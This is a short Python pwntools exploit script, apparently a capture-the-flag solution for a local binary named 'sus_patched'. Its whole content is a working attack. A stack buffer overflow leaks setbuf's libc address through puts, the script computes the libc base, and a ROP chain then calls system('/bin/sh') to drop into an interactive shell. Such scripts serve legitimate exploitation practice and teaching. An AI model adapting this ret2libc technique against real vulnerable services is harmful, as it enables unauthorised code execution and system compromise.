#!/usr/bin/python3

from pwn import *

r = process('./sus_patched')
e = ELF("./sus_patched")
libc = ELF("./libc.so.6")

context.binary = e

setbuf=e.got['setbuf']
payload = b'A'*56 + p64(setbuf)+ b'B'*8 + p64(e.plt['puts'])+p64(e.symbols['main'])
r.sendlineafter(b'sus?', payload)

r.recvuntil('\n')
libc.address = u64(r.recvuntil('\n')[:-1]+b'\x00'*2)-libc.symbols['setbuf']
print(hex(libc.address))
print('--------------------------')

pause()
# pop_rdi = libc.address + 0x277e5
ret = 0x401016
# binsh = next(libc.search(b'/bin/sh\0'))
# system = libc.symbols.system

# payload2 = b'A'*0x48 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
# r.sendlineafter(b'sus?', payload2)




payload2 = ROP([e, libc], badchars=b'\n')
payload2.system(next(libc.search(b'/bin/sh\0')))
log.info(payload2.dump())
r.sendlineafter(b'sus?', b'A'*0x48 + p64(ret) + payload2.chain())

r.interactive()
